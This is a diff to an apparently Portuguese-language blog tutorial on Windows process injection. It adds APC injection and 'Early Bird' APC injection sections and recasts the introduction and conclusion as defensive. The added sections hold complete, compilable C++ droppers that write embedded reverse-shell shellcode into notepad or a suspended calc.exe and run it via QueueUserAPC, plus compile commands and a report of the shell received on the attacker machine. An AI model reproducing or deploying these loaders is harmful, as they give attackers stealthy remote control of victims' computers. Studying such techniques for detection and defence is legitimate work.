@@ -12,7 +12,7 @@ alt: "Process Injection 101"
 
 # TL;DR
 
-Neste artigo, exploramos a técnica de _Process Injection_, uma abordagem usada por hackers para injetar código malicioso em processos legítimos que já estão em execução. O _Process Injection_ permite a execução de código de maneira furtiva, aproveitando os privilégios e recursos dos processos injetados, o que pode facilitar o acesso a informações sensíveis e a elevação de privilégios. Diversas técnicas são utilizadas para realizar essa injeção, e o artigo fornece uma introdução às mais básicas, com exemplos práticos e referências a conceitos essenciais discutidos em artigos anteriores. Este conteúdo é voltado para aqueles que desejam entender e explorar o funcionamento interno dessas técnicas como parte de seu estudo avançado em hacking.
+Neste artigo, exploramos a técnica de _Process Injection_, uma abordagem avançada que permite a injeção de código em processos legítimos em execução. Amplamente utilizada em cenários de segurança ofensiva, essa técnica facilita a execução furtiva de código, aproveitando os privilégios e recursos dos processos alvo. Abordamos diferentes métodos de _Process Injection_, como o uso de APIs específicas e exploração de vulnerabilidades, fornecendo exemplos práticos que conectam conceitos teóricos à aplicação real. O domínio dessas técnicas é essencial para profissionais que buscam aprofundar seu conhecimento em manipulação de processos e desenvolver habilidades robustas para a defesa contra ameaças avançadas. Compreender e praticar essas metodologias prepara os defensores para enfrentar e mitigar ataques sofisticados no cenário atual de cibersegurança.
 
 # Introdução
 
@@ -750,6 +750,423 @@ Ao analisarmos com o *Process Hacker 2*, vemos que o notepad tem um processo fil
 
 Porém, uma característica única desse método, é que, mesmo que o notepad seja encerrado, a *thread* continua existindo em *background* e o *payload* ainda em execução.
 
+# APC *Injection*
+
+APC (*Asynchronous Procedure Call*) é um mecanismo do Windows que permite que uma função (ou procedimento) seja executada de forma assíncrona em uma determinada *thread*. Em outras palavras, é um método pelo qual o kernel ou um processo do modo usuário pode solicitar a execução de uma função em um contexto de *thread* específico em um momento posterior.
+
+## Tipos de APCs
+
+Existem dois tipos principais de APCs no Windows:
+
+1. ***Kernel-Mode APCs***: São APCs que são enfileiradas e executadas pelo kernel do Windows. Geralmente, são usadas pelo sistema operacional para operações de baixo nível, como I/O assíncrono. Por exemplo, quando uma operação de leitura ou gravação de arquivo é feita de forma assíncrona, o driver de dispositivo pode usar um APC de modo kernel para notificar o sistema que a operação foi concluída.
+    
+2. ***User-Mode APCs***: São APCs enfileiradas em *threads* de modo usuário. Eles são mais flexíveis do que os APCs de modo kernel e podem ser usados por aplicativos para realizar operações como notificação de eventos ou execução de tarefas após a conclusão de uma operação assíncrona.
+    
+
+## Como Funciona um APC?
+
+Um APC é associado a uma *thread* específica. Quando um APC é enfileirado para uma *thread*, ele permanece na fila de APCs dessa *thread* até que a *thread* esteja em um estado em que processe o APC. Uma *thread* pode processar APCs de modo usuário quando está em um estado de "*alertable wait*", o que significa que a *thread* está em espera, mas pode ser interrompido para processar APCs.
+
+### Fluxo de Trabalho:
+
+1. **Enfileiramento do APC**: Um APC é enfileirado em uma *thread* usando funções como `QueueUserAPC` para APCs de modo usuário ou funções específicas do kernel para APCs de modo kernel.
+    
+2. ***Alertable Wait***: A *thread* deve estar em um estado em que ele possa processar o APC. No caso de um APC de modo usuário, a *thread* deve estar em uma *alertable wait* (usando funções como `SleepEx`, `WaitForSingleObjectEx`, `WaitForMultipleObjectsEx`, etc.).
+    
+3. **Execução do APC**: Quando a *thread* está em um estado de *alertable wait*, o APC enfileirado é executado. O sistema retira o APC da fila e chama a função associada ao APC.
+    
+
+## Utilização Prática dos APCs
+
+### Operações de I/O Assíncronas:
+
+Um dos usos mais comuns dos APCs é em operações de entrada/saída (I/O) assíncronas. Por exemplo, quando um programa solicita uma operação de leitura ou gravação de arquivo de forma assíncrona, ele pode especificar uma função de retorno de chamada que será executada como um APC quando a operação for concluída.
+
+### Manipulação de Sinais e Notificações:
+
+APCs podem ser usados para manipular sinais ou notificações em uma *thread*. Um exemplo disso seria a manipulação de eventos de sincronização onde, ao invés de uma *thread* ficar em loop verificando a conclusão de uma tarefa, ela pode usar um APC para ser notificado quando a tarefa estiver concluída.
+
+## Fluxo de injeção
+
+Conforme vimos, existem alguns pré-requisitos para o funcionamento do *APC Injection*, primeiramente, é preciso que a *thread* alvo esteja em estado *alertable wait*, porém, não existe uma função que nos diga o estado de uma *thread*, logo, não podemos escolher a *thread* correta.
+
+Porém, com o uso dos *snapshots* conseguimos obter o ID de **todas** as *threads* existentes em um processo, e provavelmente uma delas deve estar em estado *alertable wait*, nesse caso, podemos criar um vetor que contenha o ID de todas as *threads* do processo alvo, e iterar sobre ele usando a função [QueueUserAPC](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc) para tentar enfileirar um APC em todas elas.
+
+A função `QueueUserAPC` tem a seguinte sintaxe:
+
+```cpp
+DWORD QueueUserAPC(
+  [in] PAPCFUNC  pfnAPC,
+  [in] HANDLE    hThread,
+  [in] ULONG_PTR dwData
+);
+```
+
+Onde:
+
+- `[in] pfnAPC` é um ponteiro para a função a ser executada quando a *thread* executar uma operação *alertable wait*, em nosso caso, um ponteiro para o buffer onde injetamos o código;
+- `[in] hThread` um *handle* para a *thread* alvo;
+- `[in] dwData` um parâmetro a ser passado para a função apontada para o APC, caso exista.
+
+## Implementação no código
+
+Primeiramente, precisamos enumerar todas as *threads* do processo alvo, para isso criaremos uma função que receberá o PID do processo alvo e um vetor que receberá os IDs das suas *threads*. Criaremos nesta função um *snapshot* de todas as *threads* e iteraremos sobre elas comparando o PID do processo dono.
+
+```cpp
+DWORD getThIDs(DWORD pid, std::vector<DWORD>& thIds) {
+    HANDLE thSnapshot;
+    THREADENTRY32 te;
+    te.dwSize = sizeof(THREADENTRY32);
+
+    thSnapshot = CreateToolhelp32Snapshot(TH32CS_SHAPTHREAD, NULL);
+    if (Thread32First(thSnapshot, &te)) {
+        do {
+            // comparando o pid do processo com o pid do dono da thread
+            if (pid == te.th32OwnerProcessID) {
+                //caso positivo, adiciona o ID da thread no vetor
+                thIds.push_back(te.th32ThreadID);
+            }
+        } while (Thread32Next(thSnapshot, &te));
+    }
+
+    ClosHandle(thSnapshot);
+    return !thIds.empty();
+}
+```
+
+Uma vez que temos o vetor com os IDs de todas as *threads* do processo alvo, podemos implementar o código que fará a iteração com vetor, utilizando a função `QueueUserAPC` apara enfileirar um APC em cada uma, apontando para o buffer onde copiamos o *payload*.
+
+```cpp
+    // iterando sobre os IDs das threads
+    if (getThIDs(pid, thIds)) {
+        for (DWORD thId : thIds) {
+            ht = OpenThread(THREAD_SET_CONTEXT, FALSE, thId);
+            if (ht) {
+                QueueUserAPC((PAPCFUNC)remoteB, ht, NULL);
+                CloseHandle(ht);
+            }
+        }
+    }
+```
+
+O código completo fica:
+
+```cpp
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <tlhelp32.h>
+#include <vector>
+
+unsigned char payload[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
+"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
+"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
+"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
+"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
+"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
+"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
+"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
+"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
+"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
+"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
+"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
+"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
+"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
+"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
+"\x00\x49\x89\xe5\x49\xbc\x02\x00\x20\xfb\xc0\xa8\x47\x80"
+"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
+"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
+"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
+"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
+"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
+"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
+"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
+"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
+"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
+"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
+"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
+"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
+"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
+"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
+"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
+"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
+
+unsigned int payload_len = sizeof(payload);
+
+int findPID(const char *procName) {
+
+    HANDLE hSnapshot;
+    PROCESSENTRY32 pe32;
+    int pid = 0;
+    BOOL proc;
+
+    // snapshot de todos os processos em execucao
+    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
+
+    // inicializando dwSize
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+
+    // inicio da iteracao, primeiro processo
+    proc = Process32First(hSnapshot, &pe32);
+
+    // loop para iterar sobre os processos
+    while (proc) {
+        if (strcmp(procName, pe32.szExeFile) == 0) {
+            pid = pe32.th32ProcessID;
+            break;
+        }
+        proc = Process32Next(hSnapshot, &pe32);
+    }
+
+    // fecha o handle aberto
+    CloseHandle(hSnapshot);
+    return pid;
+}
+
+DWORD getThIDs(DWORD pid, std::vector<DWORD>& thIds) {
+    HANDLE thSnapshot;
+    THREADENTRY32 te;
+    te.dwSize = sizeof(THREADENTRY32);
+
+    thSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
+    if (Thread32First(thSnapshot, &te)) {
+        do {
+            // comparando o pid do processo com o pid do dono da thread
+            if (pid == te.th32OwnerProcessID) {
+                //caso positivo, adiciona o ID da thread no vetor
+                thIds.push_back(te.th32ThreadID);
+            }
+        } while (Thread32Next(thSnapshot, &te));
+    }
+
+    CloseHandle(thSnapshot);
+    return !thIds.empty();
+}
+
+
+int main(int argc, char* argv[]) {
+    int pid = 0;
+    HANDLE procH; // process handle
+    LPVOID remoteB; // remote buffer
+    HANDLE ht; // thread handle
+    std::vector<DWORD> thIds; // vetor para os IDs das threads
+
+    pid = findPID(argv[1]);
+
+
+    // cria o handle para o processo
+    procH = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
+
+    // aloca o buffer de memoria no processo remoto
+    remoteB = VirtualAllocEx(procH, NULL, payload_len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+
+    // copia o payload entre os processos
+    WriteProcessMemory(procH, remoteB, payload, payload_len, NULL);
+
+    // iterando sobre os IDs das threads
+    if (getThIDs(pid, thIds)) {
+        for (DWORD thId : thIds) {
+            ht = OpenThread(THREAD_SET_CONTEXT, FALSE, thId);
+            if (ht) {
+                QueueUserAPC((PAPCFUNC)remoteB, ht, NULL);
+                CloseHandle(ht);
+            }
+        }
+    }
+
+    CloseHandle(procH);
+    return 0;
+}
+
+```
+
+Podemos compilar o programa:
+
+```bash
+$ x86_64-w64-mingw32-g++ -O2 dropper.cpp -o dropper.exe -mconsole -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+```
+
+Agora podemos abrir uma instância de um notepad na máquina alvo e executar nosso programa.
+
+![](/img/posts/Pasted%20image%2020240809230301.png)
+
+Na máquina atacante, recebemos o *reverse shell*.
+
+![](/img/posts/Pasted%20image%2020240809230329.png)
+
+
+Uma particularidade sobre este processo, é que, como injetamos APC em todas as *threads* por não saber qual delas está em *alertable wait*, o *payload* é executado várias vezes, pois provavelmente existirão mais *threads* neste estado. Se analisarmos com o *Process Hacker*, veremos que o *payload* foi invocado várias vezes.
+
+
+![](/img/posts/Pasted%20image%2020240809230612.png)
+
+# *“Early Bird” APC injection*
+
+
+No exemplo anterior, selecionamos um processo legítimo, enumeramos todas as suas *threads* e injetamos o APC em todas elas, esperando que pelo menos uma estivesse em estado *alertable wait*, uma vez que não existe uma forma de descobrir se uma *thread* destá de fato neste estado.
+
+Outra técnica de *APC Injection* é o *Early bird* (esse nome fará sentido), onde, nosso próprio programa/*malware* cria um processo legítimo no Windows, porém em estado suspenso. Quando um processo é iniciado em estado suspenso, podemos manipular qualquer uma de suas *threads* inclusive a *main thread*, uma vez que esta foi manipulada para apontar para nosso *payload* podemos resumir o processo e nosso código será executado.
+
+Para podermos criar um processo legítimo em estado suspenso, utilizaremos a função [CreateProcessA](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa) que tem a seguinte sintaxe:
+
+```cpp
+BOOL CreateProcessA(
+  [in, optional]      LPCSTR                lpApplicationName,
+  [in, out, optional] LPSTR                 lpCommandLine,
+  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
+  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
+  [in]                BOOL                  bInheritHandles,
+  [in]                DWORD                 dwCreationFlags,
+  [in, optional]      LPVOID                lpEnvironment,
+  [in, optional]      LPCSTR                lpCurrentDirectory,
+  [in]                LPSTARTUPINFOA        lpStartupInfo,
+  [out]               LPPROCESS_INFORMATION lpProcessInformation
+);
+```
+
+A maioria dos parâmetros desta função são irrelevantes para o *APC Injection*, porém dois deles são de extrema importância:
+
+- `[in, optional] lpApplicationName` o *path* do processo legítimo que queremos invocar;
+- `[in] dwCreationFlags` onde definimos o estado de inicialização do processo.
+
+O Parâmetro `dwCreationFlags` segue uma [tabela de referência](https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags) das *flags* que podem ser usadas, entre elas temos a `CREATE_SUSPENDED`:
+
+![](/img/posts/Pasted%20image%2020240812083753.png)
+
+Ao iniciarmos um processo com esta *flag*, sua *thread* principal permanece suspensa até que utilizemos a função [ResumeThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread) seja executada.
+
+Outros 2 parâmetros obrigatórios para o funcionamento da função `CreateProcessA` são;
+
+- `[in] lpStartupInfo` um ponteiro para uma estrutura [STARTUPINFOA](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa) vazia que receberá informações sobre o estado de inicialização do processo;
+- `[out] lpProcessInformation` um ponteiro para uma estrutura [PROCESS_INFORMATION](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information) vazia que receberá informações sobre o processo;
+
+A estrutura `PROCESS_INFORMATION` tem o seguinte formato:
+
+```cpp
+typedef struct _PROCESS_INFORMATION {
+  HANDLE hProcess;
+  HANDLE hThread;
+  DWORD  dwProcessId;
+  DWORD  dwThreadId;
+} PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;
+```
+
+Uma particularidade importante, é que o parâmetro `hThread` será inicializado com o ID da *main thread* quando o programa for inicializado em modo suspenso, ou seja, já teremos a identificação de onde enfileirar o APC.
+
+Então, basicamente o fluxo é:
+
+1. Criar um processo legítimo em estado suspenso;
+2. Criar um *buffer* dentro deste processo;
+3. Copiar o *payload* para o *buffer*;
+4. Enfileirar um APC na *main thread* que aponta para o *buffer*;
+5. Resumir o processo.
+
+A implementação no código fica:
+
+```cpp
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+unsigned char payload[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
+"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
+"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
+"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
+"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
+"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
+"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
+"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
+"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
+"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
+"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
+"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
+"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
+"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
+"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
+"\x00\x49\x89\xe5\x49\xbc\x02\x00\x20\xfb\xc0\xa8\x47\x80"
+"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
+"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
+"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
+"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
+"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
+"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
+"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
+"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
+"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
+"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
+"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
+"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
+"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
+"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
+"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
+"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
+
+unsigned int payload_len = sizeof(payload);
+
+
+
+int main(int argc, char* argv[]) {
+    STARTUPINFO si; // criando estrutura STARTUPINFOA
+    PROCESS_INFORMATION pi; // criando estrutura PROCESS_INFORMATION
+    HANDLE procH; // process handle
+    LPVOID remoteB; // remote buffer
+    HANDLE threadH; // thread handle
+
+    ZeroMemory(&si, sizeof(si)); // zerando estrutura STATUPINFOA
+    ZeroMemory(&pi, sizeof(pi)); // zerando estrutura PROCESS_INFORMATION
+    si.cb = sizeof(si); // inicializando STATUPINFOA
+
+    // criando processo
+    CreateProcessA("C:\\Windows\\System32\\calc.exe", NULL, NULL, NULL, false, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    // alterando estado para alertable wait
+    WaitForSingleObject(pi.hProcess, 1000);
+    procH = pi.hProcess;
+    threadH = pi.hThread;
+
+    // aloca o buffer de memoria no processo
+    remoteB = VirtualAllocEx(procH, NULL, payload_len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+
+    // copia o payload entre os processos
+    WriteProcessMemory(procH, remoteB, payload, payload_len, NULL);
+
+    // injetando na thread suspensa
+    PTHREAD_START_ROUTINE apc = (PTHREAD_START_ROUTINE)remoteB;
+    QueueUserAPC((PAPCFUNC)apc, threadH, NULL);
+
+    // resumindo a thread suspensa
+    ResumeThread(threadH);
+
+    return 0;
+}
+```
+
+Podemos compilar o programa:
+
+```bash
+$ x86_64-w64-mingw32-gcc earlyBird.cpp -o earlyBird.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
+```
+
+Ao executarmos o programa, nenhuma calculadora é aberta:
+
+![](/img/posts/Pasted%20image%2020240812102208.png)
+
+Porém, ao analisarmos com o *Process Hacker*, vemos que temos uma calculadora suspensa que tem um processo filho invocando o CMD.
+
+![](/img/posts/Pasted%20image%2020240812102347.png)
+
+![](/img/posts/Pasted%20image%2020240812102608.png)
+
+E em nossa máquina atacante, temos o *reverse shell*.
+
+![](/img/posts/Pasted%20image%2020240812102410.png)
+
+Esta técnica, se torna um pouco mais *stealth* que a anterior, uma vez que a injeção ocorra antes mesmo da execução do processo alvo, porém, longe de ser difinitiva assim como as demias quando utilizada sozinha.
+
+
 # Injeção em Memória RWX
 
 Seguindo com o modelo conceitual descrito no processo explorado neste artigo, todas as técnicas até então têm uma caraterística em comum: em todos os casos, alocamos um espaço de memória com permissão RWX (leitura, escrita e execução) em um processo existente de nossa escolha. Fazemos isso com a função `VirtualAllocEx` utilizando o argumento `PAGE_EXECUTE_READWRITE`.
@@ -1005,11 +1422,13 @@ E estas limitações que normalmente deixam brechas para ataques.
 
 # Conclusão
 
-O _Process Injection_ é uma técnica poderosa e versátil que destaca a complexidade e sofisticação das práticas de *hacking* modernas. Ao dominar esses métodos, um hacker pode obter um controle significativo sobre sistemas-alvo, aproveitando processos legítimos para executar código de forma furtiva e eficiente.
+O _Process Injection_ representa uma das técnicas mais sofisticadas e versáteis no arsenal de qualquer profissional avançado em cibersegurança. Ao dominar essas técnicas, você adquire a capacidade de entender as intricadas maneiras pelas quais o código pode ser inserido e executado em processos legítimos, uma habilidade essencial tanto para o desenvolvimento de software seguro quanto para a defesa contra ameaças avançadas.
 
-Este artigo apresentou uma visão introdutória sobre as formas mais básicas de injeção de processos, proporcionando uma base sólida para o aprofundamento em técnicas mais avançadas. Entender o funcionamento interno dessas técnicas é essencial para quem deseja explorar as possibilidades que a injeção de código oferece, seja na exploração de vulnerabilidades ou na manipulação de processos dentro de um ambiente comprometido.
+Este artigo buscou oferecer uma visão detalhada e prática das principais metodologias de _Process Injection_, construindo uma ponte entre conceitos teóricos e a aplicação real no contexto de segurança da informação. Ao explorar diferentes abordagens, como o uso de APIs específicas e o aproveitamento de vulnerabilidades comuns, o conteúdo forneceu ferramentas valiosas para aprofundar o conhecimento técnico dos leitores.
 
-Ao continuarmos a expandir nosso conhecimento sobre técnicas como o _Process Injection_, é importante lembrar que o verdadeiro poder está na compreensão detalhada dos mecanismos subjacentes. Com esse entendimento, é possível explorar ao máximo as capacidades que essas técnicas oferecem, seja para pesquisa, desenvolvimento de novas abordagens ou para a prática avançada de hacking.
+À medida que as ameaças evoluem, o domínio dessas técnicas se torna ainda mais crucial para aqueles que atuam na linha de frente da cibersegurança. Entender e praticar _Process Injection_ não é apenas uma questão de aprimorar habilidades individuais, mas também de estar preparado para enfrentar e mitigar técnicas semelhantes empregadas por adversários sofisticados.
+
+Ao fim, o conhecimento aprofundado dessas técnicas permite que os profissionais de cibersegurança antecipem movimentos adversários, desenvolvam contramedidas eficazes e mantenham uma postura proativa na defesa de sistemas críticos. Com a prática constante e o aprimoramento dessas habilidades, você estará mais bem equipado para lidar com os desafios complexos do cenário de ameaças atual.
 
 # Referências
 
@@ -1031,3 +1450,8 @@ Ao continuarmos a expandir nosso conhecimento sobre técnicas como o _Process In
 - [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext)
 - [https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualqueryex](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualqueryex)
 - [https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-memory_basic_information](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-memory_basic_information)
+- [https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls](https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls)
+- [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc)
+- [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)
+- [https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags](https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags)
+- [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread
